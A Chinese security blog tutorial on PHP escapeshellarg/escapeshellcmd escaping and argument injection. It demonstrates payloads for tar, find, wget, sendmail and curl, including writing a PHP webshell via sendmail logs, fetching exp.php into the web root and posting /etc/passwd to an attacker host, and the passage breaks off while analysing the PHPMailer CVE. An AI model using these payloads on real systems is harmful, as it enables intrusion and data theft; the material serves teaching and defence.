
<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#202020">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
  
  
    <meta name="keywords" content="Web安全,PHP,">
  

  
    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
  
  
  
  <link rel="icon" type="image/x-icon" href="/1.jpg">
  
  <title>浅谈escapeshellarg逃逸与参数注入 [ Mi1k7ea ]</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
    
      <link rel="stylesheet" href="/css/xoxo.css">
    
  
</head>


<body>
  <div class="nav-container">
    <nav class="home-menu pure-menu pure-menu-horizontal">
  <a class="pure-menu-heading" href="/">
    
    <span class="title" style="text-transform:none">Mi1k7ea</span>
  </a>

  <ul class="pure-menu-list clearfix">
      
          
            
              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
            
          
      
          
            
              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
            
          
      
  </ul>
   
</nav>

  </div>

  <div class="container" id="content-outer">
    <div class="inner" id="content-inner">
      <div class="post-container">
  <article class="post" id="post">
    <header class="post-header text-center">
      <h1 class="title">
        浅谈escapeshellarg逃逸与参数注入
      </h1>
      <span>
        
        <time class="time" datetime="2019-07-04T14:54:41.000Z">
        2019-07-04
      </time>
        
      </span>
      <span class="slash">/</span>
      <span class="post-meta">
      <span class="post-tags">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
      </span>
    </span>
      <!--<span class="slash">/</span>
      <span class="read">
      <span id="busuanzi_value_page_pv"></span> 点击
    </span>
      <span class="slash">/</span>-->
    </header>

    <div class="post-content">
      <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h3><blockquote>
<p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p>
<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数。</p>
<p>函数定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; escapeshellarg ( string $arg ) : string</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</p>
</blockquote>
<p>简单地说，如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p>
<p>看个例子就知道了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(escapeshellarg($_GET[p]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先输入字符串mi1k7ea，看到escapeshellarg()会给该字符串整个加上单引号括起来，加起来总共9个字符：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/1.png" alt=""></p>
<p>输入mi1k’7ea，看到先转义了中间这个单引号，再分别在左右两边加上单引号括起来，加起来总共13个字符：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/2.png" alt=""></p>
<p>该函数正确使用的Demo，这样可有效从参数位置防御命令注入漏洞，也是参数注入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'ls '</span>.escapeshellarg($dir));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><blockquote>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>escapeshellcmd — shell 元字符转义。</p>
<p>函数定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; escapeshellcmd ( string $command ) : string</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
</blockquote>
<p>简单地说，第一，如果输入内容中上述出现的特殊字符会被反斜杠给转义掉；第二，如果单引号和双引号不是成对出现时，会被转义掉。</p>
<p>看个例子就知道了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(escapeshellcmd($_GET[p]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入mi1k7ea，其中不包含以上特殊字符的字符串，是不会添加单引号括起来的，内容不变：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/3.png" alt=""></p>
<p>输入’mi1k’7ea’;字符串，由于前面两个单引号成对了因此没有对其进行转义，而最后的单引号没有成对因此被转义掉，除此之外分号作为特殊字符也被转义处理：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/4.png" alt=""></p>
<p>该函数正确使用的Demo，这样能确保用户只执行一个命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 我们故意允许任意数量的参数</span></span><br><span class="line">$command = <span class="string">'./configure '</span>.$_POST[<span class="string">'configure_options'</span>];</span><br><span class="line"></span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line"> </span><br><span class="line">system($escaped_command);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h3><p>前面已经说了，这里再列下比较一下。</p>
<p>PHP对于命令注入漏洞提供了escapeshellarg()和escapeshellcmd()两个函数来进行防御，当然两者针对的场景有区别。</p>
<p><strong>escapeshellarg</strong></p>
<p>主要是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。</p>
<p>处理过程：如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p>
<p>场景功能：</p>
<blockquote>
<p>1.确保用户只传递一个参数给命令</p>
<p>2.用户不能指定更多的参数一个</p>
<p>3.用户不能执行不同的命令</p>
</blockquote>
<p><strong>escapeshellcmd</strong></p>
<p>主要是防止用户利用shell的一些技巧（如分号、管道符、反引号等）来进行命令注入攻击。</p>
<p>处理过程：如果输入内容中&amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF等特殊字符会被反斜杠给转义掉；如果单引号和双引号不是成对出现时，会被转义掉。</p>
<p>场景功能：</p>
<blockquote>
<p>1.确保用户只执行一个命令</p>
<p>2.用户可以指定不限数量的参数</p>
<p>3.用户不能执行不同的命令</p>
</blockquote>
<h3 id="mail-与sendmail"><a href="#mail-与sendmail" class="headerlink" title="mail()与sendmail"></a>mail()与sendmail</h3><p>后续列出的CVE漏洞涉及到这两个概念，这里提下。</p>
<p><strong>mail()</strong></p>
<p>函数定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail (</span><br><span class="line">    string $to ,</span><br><span class="line">    string $subject ,</span><br><span class="line">    string $message [,</span><br><span class="line">    string $additional_headers [,</span><br><span class="line">    string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>其参数含义分别表示如下：</p>
<blockquote>
<ul>
<li>to，指定邮件接收者，即接收人</li>
<li>subject，邮件的标题</li>
<li>message，邮件的正文内容</li>
<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
</ul>
</blockquote>
<p>在Linux系统上，mail()函数是默认调用sendmail程序发送邮件的。而这里我们看到，通过mail()函数的第五个参数即additional_parameters可以传递给发送程序sendmail额外参数。</p>
<p><strong>sendmail</strong></p>
<p>sendmail是Linux中发送邮件的程序。在其额外参数中，支持主要选项有以下三种：</p>
<blockquote>
<ol>
<li>-O option = value<br>QueueDirectory = queuedir 选择队列消息</li>
<li>-X logfile<br>这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。</li>
<li>-f from email<br>这个参数可以让我们指定我们发送邮件的邮箱地址。</li>
</ol>
</blockquote>
<p><strong>写shell利用示例</strong></p>
<p>看个示例就知道怎么通过mail()向sendmail添加额外参数来写shell了。</p>
<p>主要原理就是利用mail()第五个参数additional_parameters向sendmail程序发送额外参数-O QueueDirectory=queuedir和-X logfile，其中logfile即详细日志文件设置为Web目录中的PHP文件，而邮件中有部分内容设置为恶意PHP代码，当访问该文件时就会在Web目录生成PHP日志文件、其中详细记录包含了恶意PHP代码，再访问该PHP日志文件即可触发恶意代码执行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$to = <span class="string">"mi1k@7ea.com"</span>;</span><br><span class="line">$subject = <span class="string">"hhhhhh"</span>;</span><br><span class="line">$message = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">$headers = <span class="string">"CC: alan@7ea.com"</span>;</span><br><span class="line">$options = <span class="string">"-O QueueDirectory=/tmp -X /var/www/html/log-shell.php"</span>;</span><br><span class="line">mail($to, $subject, $message, $headers, $options);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问该文件后，过段时间（等sendmail程序反应）查看在当前Web目录生成了log-shell.php文件，其中包含我们输入的php代码：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/5.png" alt=""></p>
<p>直接访问log-shell.php即可触发代码执行：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/6.png" alt=""></p>
<h2 id="0x02-escapeshellarg与escapeshellcmd参数注入"><a href="#0x02-escapeshellarg与escapeshellcmd参数注入" class="headerlink" title="0x02 escapeshellarg与escapeshellcmd参数注入"></a>0x02 escapeshellarg与escapeshellcmd参数注入</h2><p>为什么会提到参数注入呢？——由前面我们知道，当使用了escapeshellarg和escapeshellcmd时会有效地限制了不能执行第二条命令，但是我们仍然可以将参数传递给第一个命令，也就是说，我们有机会通过参数注入来达到攻击的目的。</p>
<h3 id="何为参数注入"><a href="#何为参数注入" class="headerlink" title="何为参数注入"></a>何为参数注入</h3><blockquote>
<p>参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。</p>
</blockquote>
<p>一般的，命令的格式时这样的：cmd [参数选项1] [参数值1] …，如‘ls -l /tmp’等形式。</p>
<p>当有一条shell命令，前面的命令cmd我们不可控，但是参数选项可控或者后面部分都可控时，则可能会存命令参数注入漏洞。</p>
<p>看个经典案例——gitlist 0.6.0远程命令执行漏洞</p>
<p>gitlist是一款使用PHP开发的图形化git仓库查看工具，在其0.6.0版本中存在一处命令参数注入问题。</p>
<p>当用户对仓库中代码进行搜索时，会调用到git grep命令，如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>关键点在于<code>grep -i --line-number {$query} $branch</code>，这里\$query是搜索的关键字、由外部参数传入并经过escapeshellarg()过滤，\$branch是搜索的分支。</p>
<p>但是如果如果用户输入的\$query的值是–open-files-in-pager=id;时就可以执行id命令，造成命令参数注入漏洞。</p>
<p>escapeshellarg为啥不生效呢？——原因在于该条命令没有限制\$query只能填在“参数值”的位置，而是可以填在“参数选项”的位置，导致可以注入–open-files-in-pager参数选项来进行命令参数注入，导致RCE。</p>
<p>具体分析参考P神的文章：<a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html" target="_blank" rel="noopener">《谈escapeshellarg绕过与参数注入漏洞》</a></p>
<h3 id="escapeshellarg-gt-escapeshellcmd参数注入"><a href="#escapeshellarg-gt-escapeshellcmd参数注入" class="headerlink" title="escapeshellarg&gt;escapeshellcmd参数注入"></a>escapeshellarg&gt;escapeshellcmd参数注入</h3><p>当代码先对输入进行escapeshellarg()处理再进行escapeshellcmd()处理时，则存在参数注入漏洞，具体原理结合下面的Demo来讲解。</p>
<p>先看个Demo理解一下。</p>
<p>看个ls命令参数注入的示例，原本功能是列出tmp目录中除去输入文件名外的所有文件，但是这里我们可以通过参数注入向参数选项注入-l来列出所有详细的文件信息：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">"ls --ignore="</span>.escapeshellarg($_GET[c]).<span class="string">" /tmp"</span>));</span><br><span class="line"><span class="comment">//echo escapeshellcmd("ls --ignore=".escapeshellarg($_GET[c])." /tmp");</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入payload<code>alan&#39; -l+</code>，最后的加号表示空格：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/9.png" alt=""></p>
<p>怎么形成参数注入的呢？</p>
<p>我们echo输出看下输入的内容最后是什么形式的：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/10.png" alt=""></p>
<p>根据前面escapeshellarg与escapeshellcmd的原理分析一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//初始输入</span><br><span class="line">alan&apos; -l+</span><br><span class="line"></span><br><span class="line">//经过escapeshellarg()处理</span><br><span class="line">&apos;alan&apos;\&apos;&apos; -l+&apos;</span><br><span class="line"></span><br><span class="line">//拼接命令</span><br><span class="line">ls --ignore=&apos;alan&apos;\&apos;&apos; -l+&apos; /tmp</span><br><span class="line"></span><br><span class="line">//经过escapeshellcmd()处理，即上图的输出结果</span><br><span class="line">ls --ignore=&apos;alan&apos;\\&apos;&apos; -l+\&apos; /tmp</span><br><span class="line"></span><br><span class="line">//输出结果简化，等同于</span><br><span class="line">ls --ignore=alan\ -l &apos; /tmp</span><br></pre></td></tr></table></figure>
<p>分析可知：</p>
<ul>
<li><strong>当用户输入包含单引号时，先用escapeshellarg()处理会给该单引号添加转义符，再用escapeshellcmd()处理时会将该添加的转义符再添加一个转义符，从而导致单引号被逃逸掉，从而造成参数注入漏洞的存在；</strong></li>
<li>如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞；</li>
</ul>
<h3 id="tar参数注入"><a href="#tar参数注入" class="headerlink" title="tar参数注入"></a>tar参数注入</h3><p>tar命令的–use-compress-program参数选项可以执行shell命令，若存在参数注入则可利用。</p>
<p>示例应用escapeshellcmd()过滤，但用户输入的位置可以设置为参数选项，导致参数注入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">'tar '</span>.$_GET[c]));</span><br><span class="line"><span class="comment">//system('tar '.escapeshellcmd($_GET[c]));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入payload<code>--use-compress-program=&#39;touch /var/www/html/hacked&#39; -cf /tmp/passwd /etc/passwd</code>：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/7.png" alt=""></p>
<h3 id="find参数注入"><a href="#find参数注入" class="headerlink" title="find参数注入"></a>find参数注入</h3><p>find命令的-exec参数选项可以执行命令，若存在参数注入则可利用。</p>
<p>原意为在tmp目录查找指定文件，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">'find /tmp -iname '</span>.$_GET[c]));</span><br><span class="line"><span class="comment">//system('find /tmp -iname '.escapeshellcmd($_GET[c]));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入payload<code>sth -or -exec pwd ; -quit</code>：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/8.png" alt=""></p>
<h3 id="wget参数注入"><a href="#wget参数注入" class="headerlink" title="wget参数注入"></a>wget参数注入</h3><p>wget命令的–directory-prefix参数选项可以将目标文件下载到指定目录中，若存在参数注入则可利用。</p>
<p>原意为下载指定Web服务中的文件，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">"wget "</span>.$_GET[c]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入payload<code>--directory-prefix=/var/www/html http://a.com/exp.php</code>：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/11.png" alt=""></p>
<h3 id="sendmail参数注入"><a href="#sendmail参数注入" class="headerlink" title="sendmail参数注入"></a>sendmail参数注入</h3><p>sendmail在前面已经讲过，这里多说一个参数-C File，用File变量指定的备用配置文件启动sendmail命令。</p>
<p>原意为向指定输入邮箱发送mail.txt文件内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">system(<span class="string">"/usr/sbin/sendmail -t -i -f"</span>.escapeshellcmd($_GET[c]).<span class="string">' &lt; mail.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>除了第一节讲的将shell写到设置在Web目录的日志文件中的利用方法外，还可以进行以下的利用，利用-C参数选项读取任意文件内容。</p>
<p>输入<a href="mailto:payload`a@b.com" target="_blank" rel="noopener">payload`a@b.com</a> -C/etc/passwd -X/tmp/output.txt`：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/12.png" alt=""></p>
<h3 id="curl参数注入"><a href="#curl参数注入" class="headerlink" title="curl参数注入"></a>curl参数注入</h3><p>curl命令的-F参数选项为以POST方式提交表单，-T参数选项为上传文件，这些参数选项都存在参数注入风险。</p>
<p>原意为访问指定URL并返回响应报文中body的内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(escapeshellcmd(<span class="string">"curl "</span>.$_GET[c]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>示例注入的是-F参数选项，在攻击者服务器编写接收POST方法表单内容的php文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'mi1k7ea.txt'</span>, file_get_contents($_FILES[<span class="string">'filename'</span>][<span class="string">'tmp_name'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入payload<code>-F filename=@/etc/passwd http://a.com/b.php</code>：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/13.png" alt=""></p>
<h3 id="Bypass技巧——除非ASCII字符"><a href="#Bypass技巧——除非ASCII字符" class="headerlink" title="Bypass技巧——除非ASCII字符"></a>Bypass技巧——除非ASCII字符</h3><p>如果未设置LANG环境变量，则去除非ASCII字符。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[c]) &amp;&amp; strtolower($_GET[c])!==<span class="string">'system'</span>)&#123;</span><br><span class="line">        <span class="comment">//var_dump(escapeshellcmd($_GET[c]));</span></span><br><span class="line">        call_user_func(escapeshellcmd($_GET[c]), escapeshellarg($_GET[p]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入payload<code>c=systāem&amp;p=whoami</code>，只要包含了非ASCII字符且未设置LANG环境变量，escapeshellarg()就会去除非ASCII字符，来Bypass某些情况：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/14.png" alt=""></p>
<p>输出看下Demo就知道了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$filename = <span class="string">'mi1kā7eā.txt'</span>;</span><br><span class="line">var_dump(escapeshellarg($filename));</span><br><span class="line">setlocale(LC_CTYPE, <span class="string">'en_US.utf8'</span>);</span><br><span class="line">var_dump(escapeshellarg($filename));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/15.png" alt=""></p>
<h2 id="0x03-漏洞分析——PHPMailer命令执行漏洞"><a href="#0x03-漏洞分析——PHPMailer命令执行漏洞" class="headerlink" title="0x03 漏洞分析——PHPMailer命令执行漏洞"></a>0x03 漏洞分析——PHPMailer命令执行漏洞</h2><p>这里以PHPMailer的两个CVE漏洞（CVE-2016-10045和CVE-2016-10033）来逐步分析escapeshellarg和escapeshellcmd的参数注入引起的问题。</p>
<h3 id="CVE-2016-10033"><a href="#CVE-2016-10033" class="headerlink" title="CVE-2016-10033"></a>CVE-2016-10033</h3><p>环境：<a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p>
<p>前提条件：</p>
<ul>
<li>php版本 &lt; 5.2.0；</li>
<li>phpmailer版本 &lt; 5.2.18；</li>
<li>php未安装pcre；</li>
<li>安全模式未开启即safe_mode = false（default）；</li>
</ul>
<p>访问页面，是个表单，输入对应的内容即发送邮件：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/16.png" alt=""></p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>看下index.php的代码，关键表单代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    $name=$_REQUEST[<span class="string">'name'</span>];</span><br><span class="line">    $email=$_REQUEST[<span class="string">'email'</span>];</span><br><span class="line">    $message=$_REQUEST[<span class="string">'message'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($name==<span class="string">""</span>)||($email==<span class="string">""</span>)||($message==<span class="string">""</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"There are missing fields."</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require</span> <span class="string">'vulnerable/PHPMailerAutoload.php'</span>;</span><br><span class="line">        $mail = <span class="keyword">new</span> PHPMailer;</span><br><span class="line">        $mail-&gt;Host = <span class="string">"localhost"</span>;</span><br><span class="line"></span><br><span class="line">        $mail-&gt;setFrom($email, <span class="string">'Vulnerable Server'</span>);</span><br><span class="line">        $mail-&gt;addAddress(<span class="string">'admin@vulnerable.com'</span>, <span class="string">'Hacker'</span>);</span><br><span class="line">        $mail-&gt;Subject  = <span class="string">"Message from $name"</span>;</span><br><span class="line">        $mail-&gt;Body     = $message;</span><br><span class="line">        <span class="keyword">if</span>(!$mail-&gt;send()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Message was not sent.'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Mailer error: '</span> . $mail-&gt;ErrorInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Message has been sent.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，这里是通过新建PHPMailer对象来发送邮件的，其中setFrom、Subject和Body三个参数可控。</p>
<p>下面开始逐步分析漏洞根源，主要看class.papmailer.php文件。</p>
<p>按照index.php中php代码逻辑分析，第一个调用的函数是\$mail-&gt;setFrom()，用来设置源email地址，看到对应的代码，主要是对输入的\$address进行相应的处理，去掉空格和换行，判断是否有@、是否含有非8比特的字符、是否之处IDN，再校验邮箱地址是否合法，最后将\$address赋值给\$this-&gt;From和\$this-&gt;Sender：</p>
